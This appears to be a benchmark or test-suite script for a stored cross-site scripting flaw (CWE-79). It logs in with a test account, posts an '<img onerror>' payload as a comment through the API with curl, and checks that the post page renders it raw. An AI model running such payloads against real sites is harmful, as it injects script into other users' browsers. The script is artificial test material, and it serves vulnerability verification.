#!/usr/bin/env bash
# XSS-STORED-001 (CWE-79): a comment body is rendered as raw HTML on the post page.
set -e; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
WID=$(post_id acme-welcome)
PAYLOAD='<img src=x onerror=alert(1337)>'
curl -s -b "$JAR" -X POST "$TARGET/api/comments" -H 'content-type: application/json' \
  -d "{\"postId\":\"$WID\",\"body\":\"$PAYLOAD\"}" >/dev/null
curl -s "$TARGET/posts/$WID" | grep -q '<img src=x onerror=alert(1337)>'
